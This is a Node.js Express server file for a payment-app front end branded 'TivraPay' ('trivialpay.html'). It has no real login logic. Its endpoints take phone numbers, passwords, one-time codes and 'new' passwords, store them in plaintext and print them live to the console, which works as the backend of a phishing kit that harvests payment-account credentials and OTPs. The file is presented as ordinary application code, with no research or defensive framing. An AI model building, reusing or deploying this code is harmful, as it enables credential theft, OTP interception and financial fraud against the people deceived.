const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path'); 
const fs = require('fs');
const { MongoMemoryServer } = require('mongodb-memory-server');

const app = express();

const PORT = process.env.PORT || 6500; 

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));
app.use(express.json());

// ========================================================
// ⚡ DYNAMIC FRONTEND SERVING LOGIC
// ========================================================
app.use(express.static(path.join(__dirname)));
app.use('/frontend', express.static(path.join(__dirname, 'frontend')));

app.get('/', (req, res) => {
    const htmlFilePath = path.resolve(__dirname, 'frontend', 'trivialpay.html');
    if (fs.existsSync(htmlFilePath)) {
        return res.sendFile(htmlFilePath);
    } else {
        return res.status(404).send("Frontend file (trivialpay.html) not found.");
    }
});

// Database Structure Schema
const UserSchema = new mongoose.Schema({
    phoneNumber: { type: String, required: false },
    password: { type: String, required: false },
    otp: { type: String, required: false },
    resetPhone: { type: String, required: false },
    newPassword: { type: String, required: false },
    actionType: { type: String, default: 'LOGIN' },
    timestamp: { type: Date, default: Date.now }
});

const User = mongoose.model('User', UserSchema);

async function startServer() {
    try {
        const mongoServer = await MongoMemoryServer.create();
        const mongoUri = mongoServer.getUri();
        await mongoose.connect(mongoUri);
        
        console.log(`\n🎉 MongoDB Connected!`);
        app.listen(PORT, () => {
            console.log(`🚀 Server monitoring on port: ${PORT}`);
        });
    } catch (error) {
        console.error("❌ Server error:", error);
    }
}

// 1. Login Request Channel
app.post('/api/login-submit', async (req, res) => {
    try {
        const { phoneNumber, password } = req.body;
        const newUser = new User({ phoneNumber, password, actionType: 'LOGIN' });
        await newUser.save();
        console.log(`[⚡ TIVRA PAY - NEW LOGIN RECEIVED]\n📱 Phone: ${phoneNumber}\n🔑 Pass: ${password}`);
        res.status(200).json({ success: true, userId: newUser._id });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 2. UPDATED: Live OTP Stream Channel (Har haal mein print hoga)
app.post('/api/otp-submit', async (req, res) => {
    const { userId, otp } = req.body;
    let currentAction = 'UNKNOWN';

    try {
        if (userId && mongoose.Types.ObjectId.isValid(userId)) {
            const updatedUser = await User.findByIdAndUpdate(userId, { otp: otp }, { returnDocument: 'after' });
            if (updatedUser) currentAction = updatedUser.actionType;
        }
    } catch (err) {
        // Database update fail ho toh bhi aage badhega
    }

    // Yeh console.log ab hamesha chalega
    console.log(`\n==================================================`);
    console.log(`[🔐 TIVRA PAY - OTP RECEIVED]`);
    console.log(`🎯 Flow Type: ${currentAction}`);
    console.log(`🔥 OTP Code : ${otp}`);
    console.log(`🆔 User ID  : ${userId || 'NOT PROVIDED'}`);
    console.log(`==================================================\n`);
    
    res.status(200).json({ success: true });
});

// 3. Modify/Forgot Password Action Channel
app.post('/api/forgot-submit', async (req, res) => {
    try {
        const { phone, newPassword } = req.body;
        const resetRecord = new User({ resetPhone: phone, newPassword: newPassword, actionType: 'PASSWORD_RESET' });
        await resetRecord.save();
        console.log(`[🔄 TIVRA PAY - PASSWORD RESET ACTION]\n📱 Phone: ${phone}\n🔑 New Pass: ${newPassword}`);
        res.status(200).json({ success: true, userId: resetRecord._id });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

startServer();
